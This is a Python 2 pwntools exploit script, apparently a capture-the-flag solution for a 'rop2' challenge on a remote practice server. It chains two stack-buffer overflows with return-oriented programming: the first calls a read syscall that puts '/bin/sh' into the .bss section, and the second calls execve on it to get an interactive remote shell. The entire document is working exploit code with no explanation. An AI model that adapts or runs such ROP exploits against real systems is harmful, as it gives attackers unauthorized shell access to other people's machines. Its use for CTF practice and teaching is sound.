#!/usr/bin/env python2

from pwn import *
import pwnlib.elf

p = remote('hackme.inndy.tw', 7703)
e = ELF('./rop2')

payload = 'A' * 16 + p32(e.symbols['syscall']) + p32(e.symbols['overflow']) + p32(3) + p32(0)
payload += p32(e.bss()) + p32(8) # syscall(3, 0, Bss, 8)

p.sendline(payload)
p.send('/bin/sh\x00')

payload = 'A' * 16 + p32(e.symbols['syscall']) + p32(e.symbols['overflow']) + p32(0xb) + p32(e.bss())
payload += p32(0) + p32(0) # syscall(0xb, '/bin/sh', 0, 0)
p.sendline(payload)

p.interactive()
p.close()
